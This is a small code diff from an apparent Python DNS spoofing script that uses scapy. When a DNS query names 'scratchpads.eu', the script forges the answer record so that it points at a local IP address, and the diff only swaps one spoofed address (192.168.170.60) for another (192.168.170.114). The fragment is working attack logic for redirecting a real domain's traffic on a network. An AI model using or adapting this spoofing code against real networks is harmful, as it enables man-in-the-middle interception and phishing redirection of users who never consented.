@@ -12,7 +12,7 @@ def process_packet(packet):
         #print(scapy_pack.show())
         if "scratchpads.eu" in qname:
             print("[+] Spoofing address :")
-            answer = scapy.DNSRR(rrname=qname, rdata="192.168.170.60")
+            answer = scapy.DNSRR(rrname=qname, rdata="192.168.170.114")
             #applyt the modification into the packet answer
             scapy_pack[scapy.DNS].an = answer
             #change answer responce number to 1 (replace 4...)
